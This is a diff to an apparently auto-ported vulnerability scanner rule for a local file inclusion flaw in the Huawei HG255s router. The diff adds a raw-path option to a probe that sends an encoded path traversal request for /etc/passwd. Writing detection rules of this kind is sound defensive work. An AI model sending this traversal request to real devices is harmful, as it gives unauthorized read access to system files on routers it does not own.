@@ -3,7 +3,7 @@ id: "cortex.community:huawei-hg255s-lfi"
 rule_version: "1.0.0"
 requires:
   engine_api: 1
-  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+  capabilities: ["http.standard.v1", "http.preserve_raw_path.v1", "matchers.basic.v1", "proof.signal.v1"]
 info:
   name: "Huawei HG255s - Local File Inclusion"
   description: "Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
@@ -21,7 +21,7 @@ finding:
 execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
 steps:
   - id: "probe0"
-    request: { method: "GET", path: "/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" }
+    request: { method: "GET", path: "/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd", path_mode: "preserve_raw" }
 proof:
   kind: "signal.v1"
   assertions:
